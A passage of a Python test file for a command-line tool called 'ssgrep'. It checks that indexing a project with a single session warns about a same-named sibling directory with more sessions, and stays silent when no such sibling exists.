    assert payload_entries.get(old_sibling) == 5


def test_index_one_session_warns_when_same_named_sibling_exists(tmp_path):
    """End-to-end: `ssgrep index` reporting exactly 1 session must warn on
    stderr, naming the same-named rejected directory and an actionable
    command -- the field report's 'Indexed 1 sessions should have warned me
    that a 579-session sibling scope existed'."""
    home = tmp_path / "home"
    project = tmp_path / "code" / "neworg" / "raf-platform"
    project.mkdir(parents=True)
    old_sibling = "/Users/me/code/oldorg/raf-platform"
    _build_corpus(home, {old_sibling: 5, str(project): 1})

    result = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)

    assert result.returncode == 0
    assert "Indexed 1 sessions" in result.stdout
    # Positive assertions: the warning names the sibling and offers the command
    assert (
        old_sibling in result.stderr
    ), f"stderr must name the same-named rejected directory; got: {result.stderr!r}"
    assert "ssgrep index --scope" in result.stderr


def test_index_one_session_stays_silent_without_a_same_named_sibling(tmp_path):
    """The precision guard: a genuinely small project (1 session, rejected
    transcripts all belong to DIFFERENTLY-named projects) must not warn --
    otherwise every fresh project on a busy machine gets a false alarm."""
    home = tmp_path / "home"
    project = tmp_path / "code" / "tinyproj"
    project.mkdir(parents=True)
    _build_corpus(home, {"/Users/me/code/otherproj": 4, str(project): 1})

    result = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)

    assert result.returncode == 0
    assert "Indexed 1 sessions" in result.stdout
    assert (
        "same-named" not in result.stderr
    ), f"no same-named sibling exists, so no warning should fire; got: {result.stderr!r}"
